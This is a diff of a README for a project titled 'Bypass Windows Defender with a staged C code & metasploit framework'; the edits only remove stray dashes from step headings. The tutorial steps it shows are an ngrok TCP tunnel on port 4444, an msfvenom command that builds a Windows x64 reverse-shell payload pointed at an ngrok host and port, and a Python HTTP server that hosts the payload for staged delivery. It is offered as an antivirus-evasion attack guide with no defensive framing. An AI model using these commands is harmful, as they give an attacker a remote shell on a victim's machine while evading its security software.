@@ -16,11 +16,11 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
 
 ### Tutorial
 
-- Create the tcp tunnel on the port 4444 -
+- Create the tcp tunnel on the port 4444
   ```
   sudo ngrok tcp 4444
   ```
-- Copy the IP and the PORT of the server -
+- Copy the IP and the PORT of the server 
   ```
    - IP: 4.tcp.eu.ngrok.io
    - PORT: 15819
@@ -30,12 +30,12 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
     <img src="https://github.com/HaxL0p4/Bypass-Windows-Defender/blob/main/ngrok-tcp.jpg">
    </p>
 
-- Create the .bin payload using msfvenom -
+- Create the .bin payload using msfvenom 
   ```
    - msfvenom -p windows/x64/shell_reverse_tcp LHOST=4.tcp.eu.ngrok.io LPORT=15819 -f raw -o payload.bin
   ```
 
-- Launch a Python HTTP server in the same directory where the payload is located -
+- Launch a Python HTTP server in the same directory where the payload is located 
   ```
    - python -m http.server 8090
   ```
